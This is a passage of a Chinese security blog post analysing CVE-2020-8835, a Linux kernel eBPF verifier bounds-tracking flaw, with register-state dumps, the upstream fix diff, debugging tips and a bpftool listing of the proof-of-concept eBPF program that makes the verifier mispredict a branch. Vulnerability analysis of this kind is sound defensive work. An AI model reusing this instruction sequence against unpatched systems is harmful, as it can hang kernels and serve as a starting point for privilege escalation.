+      subreg_def = 0x0,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+
+下面来解释下为什么会有这样的变化
+
+在遇到跳转指令的时候，会调用`check_cond_jmp_op`来检查该指令
+
+在该函数中，由于`r0`不是一个确定的数字，因此会调用`reg_set_min_max_inv`来设置寄存器的最大最小值
+
+    
+    
+    static void reg_set_min_max_inv(struct bpf_reg_state *true_reg,
+                    struct bpf_reg_state *false_reg, u64 val,
+                    u8 opcode, bool is_jmp32)
+    {
+        s64 sval;
+    
+        if (__is_pointer_value(false, false_reg))
+            return;
+    
+        val = is_jmp32 ? (u32)val : val;
+        sval = is_jmp32 ? (s64)(s32)val : (s64)val;
+    
+        switch (opcode) {
+        ……
+        case BPF_JSLE:
+        case BPF_JSLT:
+        {
+            s64 false_smax = opcode == BPF_JSLT ? sval    : sval - 1;
+            s64 true_smin = opcode == BPF_JSLT ? sval + 1 : sval;
+    
+            if (is_jmp32 && !cmp_val_with_extended_s64(sval, false_reg))
+                break;
+            false_reg->smax_value = min(false_reg->smax_value, false_smax);
+            true_reg->smin_value = max(true_reg->smin_value, true_smin);
+            break;
+        }
+        default:
+            break;
+        }
+    
+        __reg_deduce_bounds(false_reg);
+        __reg_deduce_bounds(true_reg);
+        /* We might have learned some bits from the bounds. */
+        __reg_bound_offset(false_reg);
+        __reg_bound_offset(true_reg);
+        if (is_jmp32) {            <----------------------            __reg_bound_offset32(false_reg);    <-------------------            __reg_bound_offset32(true_reg);        <-------------------        }
+        /* Intersecting with the old var_off might have improved our bounds
+         * slightly.  e.g. if umax was 0x7f...f and var_off was (0; 0xf...fc),
+         * then new var_off is (0; 0x7f...fc) which improves our umax.
+         */
+        __update_reg_bounds(false_reg);
+        __update_reg_bounds(true_reg);
+    }
+    
+
+这里的`false_reg`和`true_reg`表示两种状态，即该`if`不成立时的`reg`和`if`成立时的`reg`
+
+漏洞所处代码就在箭头所指的地方，这里仅跟进`false_reg`
+
+先说明执行`__reg_bound_offset32`函数之前，`false_reg`的状态
+
+    
+    
+    $false_reg = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0x0,
+        mask = 0x1ffffffff
+      },
+      smin_value = 0x30303030,
+      smax_value = 0x13030302f,
+      umin_value = 0x30303030,
+      umax_value = 0x13030302f,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
+      subreg_def = 0x0,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+    
+    
+    static void __reg_bound_offset32(struct bpf_reg_state *reg)
+    {
+        u64 mask = 0xffffFFFF;
+        struct tnum range = tnum_range(reg->umin_value & mask,
+                           reg->umax_value & mask);
+        struct tnum lo32 = tnum_cast(reg->var_off, 4);
+        struct tnum hi32 = tnum_lshift(tnum_rshift(reg->var_off, 32), 32);
+    
+        reg->var_off = tnum_or(hi32, tnum_intersect(lo32, range));
+    }
+    
+
+该函数执行完之后，寄存器的状态变为：
+
+    
+    
+    $r0 = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0x30303020,
+        mask = 0x10000001f
+      },
+      smin_value = 0x30303030,
+      smax_value = 0x13030302f,
+      umin_value = 0x30303030,
+      umax_value = 0x13030302f,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
+      subreg_def = 0x0,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+
+再之后，执行`__update_reg_bounds(false_reg)`之后：
+
+    
+    
+    static void __update_reg_bounds(struct bpf_reg_state *reg)
+    {
+        /* min signed is max(sign bit) | min(other bits) */
+        reg->smin_value = max_t(s64, reg->smin_value,
+                    reg->var_off.value | (reg->var_off.mask & S64_MIN));
+        /* max signed is min(sign bit) | max(other bits) */
+        reg->smax_value = min_t(s64, reg->smax_value,
+                    reg->var_off.value | (reg->var_off.mask & S64_MAX));
+        reg->umin_value = max(reg->umin_value, reg->var_off.value);
+        reg->umax_value = min(reg->umax_value,
+                      reg->var_off.value | reg->var_off.mask);
+    }
+    
+
+`reg`不变，这里可以推导一下
+
+###  6: (07) r0 += -2144337872
+
+执行完这一句之后，寄存器状态：
+
+    
+    
+    $r0 = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0xb0603040,
+        mask = 0xffffffff0000003f
+      },
+      smin_value = 0xffffffffb0603060,
+      smax_value = 0xb060305f,
+      umin_value = 0x0,
+      umax_value = 0xffffffffffffffff,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
+      subreg_def = 0x0,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+
+###  7: (14) w0 -= -1607454672
+
+执行这一句的时候，先会用`coerce_reg_to_size`把寄存器转换为32位
+
+    
+    
+    $r0 = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0xb0603040,
+        mask = 0x3f
+      },
+      smin_value = 0x0,
+      smax_value = 0xffffffff,
+      umin_value = 0x0,
+      umax_value = 0xffffffff,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
+      subreg_def = 0x8,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+
+然后再做减法并改变`var_off`：
+
+    
+    
+    $r0 = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0x10300000,
+        mask = 0x7f
+      },
+      smin_value = 0xffffffff5fcfcfd0,
+      smax_value = 0x5fcfcfcf,
+      umin_value = 0x0,
+      umax_value = 0xffffffffffffffff,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
+      subreg_def = 0x8,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+
+再`coerce_reg_to_size`转为32位：
+
+    
+    
+    $r0 = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0x10300000,
+        mask = 0x7f
+      },
+      smin_value = 0x0,
+      smax_value = 0xffffffff,
+      umin_value = 0x0,
+      umax_value = 0xffffffff,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
+      subreg_def = 0x8,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+
+最后，在`__update_reg_bounds`函数中，寄存器被变为：
+
+    
+    
+    $r0 = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0x10300000,
+        mask = 0x7f
+      },
+      smin_value = 0x10300000,
+      smax_value = 0x1030007f,
+      umin_value = 0x10300000,
+      umax_value = 0x1030007f,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
+      subreg_def = 0x8,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+
+###  9: (76) if w0 s>= 0x303030 goto pc+2
+
+相关代码为：
+
+    
+    
+    case BPF_JSGE:
+            if (reg->smin_value >= sval)
+                return 1;
+            else if (reg->smax_value < sval)
+                return 0;
+            break;
+    
+
+这里`reg->smin_value`为`0x10300000`，`sval`为`0x303030`，可以看到这里会返回1，表示该if语句恒成立
+
+那么从此刻开始，下一个被检测的语句就变成了第12句，而第10和第11句就被patch成了`goto pc-1`
+
+然而，在实际的计算过程中，此刻的`w0`为`0xCFD0`，小于`0x303030`，就会导致真正在执行的过程中，内核会执行`goto
+pc-1`，导致空转，死循环
+
+## 深入思考
+
+作者是如何修复该漏洞的？
+
+    
+    
+    diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
+    index 047b2e8..2a84f73 100644
+    --- a/kernel/bpf/verifier.c
+    +++ b/kernel/bpf/verifier.c
+    @@ -1036,17 +1036,6 @@ static void __reg_bound_offset(struct bpf_reg_state *reg)
+                              reg->umax_value));
+     }
+    
+    -static void __reg_bound_offset32(struct bpf_reg_state *reg)
+    -{
+    -    u64 mask = 0xffffFFFF;
+    -    struct tnum range = tnum_range(reg->umin_value & mask,
+    -                       reg->umax_value & mask);
+    -    struct tnum lo32 = tnum_cast(reg->var_off, 4);
+    -    struct tnum hi32 = tnum_lshift(tnum_rshift(reg->var_off, 32), 32);
+    -    -    reg->var_off = tnum_or(hi32, tnum_intersect(lo32, range));
+    -}
+    -     /* Reset the min/max bounds of a register */
+     static void __mark_reg_unbounded(struct bpf_reg_state *reg)
+     {
+    @@ -5805,10 +5794,6 @@ static void reg_set_min_max(struct bpf_reg_state *true_reg,
+         /* We might have learned some bits from the bounds. */
+         __reg_bound_offset(false_reg);
+         __reg_bound_offset(true_reg);
+    -    if (is_jmp32) {
+    -        __reg_bound_offset32(false_reg);
+    -        __reg_bound_offset32(true_reg);
+    -    }
+         /* Intersecting with the old var_off might have improved our bounds
+          * slightly.  e.g. if umax was 0x7f...f and var_off was (0; 0xf...fc),
+          * then new var_off is (0; 0x7f...fc) which improves our umax.
+    @@ -5918,10 +5903,6 @@ static void reg_set_min_max_inv(struct bpf_reg_state *true_reg,
+         /* We might have learned some bits from the bounds. */
+         __reg_bound_offset(false_reg);
+         __reg_bound_offset(true_reg);
+    -    if (is_jmp32) {
+    -        __reg_bound_offset32(false_reg);
+    -        __reg_bound_offset32(true_reg);
+    -    }
+         /* Intersecting with the old var_off might have improved our bounds
+          * slightly.  e.g. if umax was 0x7f...f and var_off was (0; 0xf...fc),
+          * then new var_off is (0; 0x7f...fc) which improves our umax.
+    
+
+可以看到，作者只删除了`__reg_bound_offset32`这一函数便完成了漏洞的修补
+
+为什么`__reg_bound_offset32`函数会导致漏洞呢？
+
+如果将该函数patch掉，发现，在执行完第五句指令之后，`r0->var_off = {0x0,
+0x1ffffffff}`，而不是patch前的``r0->var_off = {0x30303020, 0x10000001f}`
+
+正是由于这里`var_off`的偏差，如同导火索一般，导致在之后的ALU运算中，内核在调用`__update_reg_bounds`等函数来更新边界的过程中出现了偏差，导致检验系统的出错
+
+另外，由于系统增加了`patch dead code`的操作，导致想要利用漏洞构造任意读写的难度大大增加
+
+## 调试技巧
+
+###  编译选项
+
+可以将内核中`debug info`打开，然后再编辑`.config`文件，开启所有带有`BPF`字样的配置
+
+其中，`CONFIG_BPF_SYSCALL`必须打开，不然无法使用`bpf`系统调用
+
+其他的配置中，某个配置没有打开会导致gdb调试的时候无法在相关函数下断点，而我并没有找是哪一个配置，索性就全部打开
+
+###  调试
+
+主要调试的代码位于`kernel/bpf/verifier.c`中，可以根据源代码，利用`b kernel/bpf/verifier.c:行数`的方式下断点
+
+另外，调试的时候Poc中最后一个跳转最好改变一下，比如从`JSGE`改为`JSLT`，使条件不成立，这样可以方便我们多次调试
+
+###  打印内核中载入的eBPF程序
+
+可以将内核源码复制到镜像中，然后在虚拟机中进入`tools/bpf/bpftool`目录下，执行`make`，编译出`bpftool`
+
+编译完成之后，有两条相关指令
+
+`./bpftool p s`会显示出内核中载入的`eBPF`程序的`id`等信息
+
+    
+    
+    root@syzkaller:~# ./bpftool p s
+    5: socket_filter  tag 31bce63e92f471c4  gpl
+        loaded_at 2020-04-17T03:31:44+0000  uid 1000
+        xlated 88B  jited 89B  memlock 4096B
+    
+
+`./bpftool p d x i id`可以打印出具体的`eBPF`程序
+
+    
+    
+    root@syzkaller:~# ./bpftool p d x i 5
+       0: (b7) r0 = 808464432
+       1: (7f) r0 >>= r0
+       2: (14) w0 -= 808464432
+       3: (07) r0 += 808464432
+       4: (b7) r1 = 808464432
+       5: (de) if w1 s<= w0 goto pc+0
+       6: (07) r0 += -2144337872
+       7: (14) w0 -= -1607454672
+       8: (76) if w0 s>= 0x303030 goto pc+1
+       9: (05) goto pc-1
+      10: (95) exit
+    
+
+## 链接
+
+[1]
+<https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f2d67fec0b43edce8c416101cdc52e71145b5fef>
+
+[2]
+<https://elixir.bootlin.com/linux/v5.6-rc5/source/kernel/bpf/verifier.c#L9984>
+
+[3]
+<https://github.com/DayJun/Blogs/blob/master/Articles/CVES/CVE-2020-8835/poc.c>
+
+[4]
+<https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-641cd7b06c911c5935c34f24850ea18690649917.tar.gz>
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **DaJun** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/203284](/post/id/203284)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [CVE](/tag/CVE)
+  * [BPF](/tag/BPF)
+  * [Linux Kernel](/tag/Linux Kernel)
+
+ **+1** __3赞
+
+ __收藏
+
+![](https://thirdqq.qlogo.cn/g?b=oidb&k=lmSW5xT2Gfib3ibY7sbHZY3A&s=40&t=1559197723)
+DaJun
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
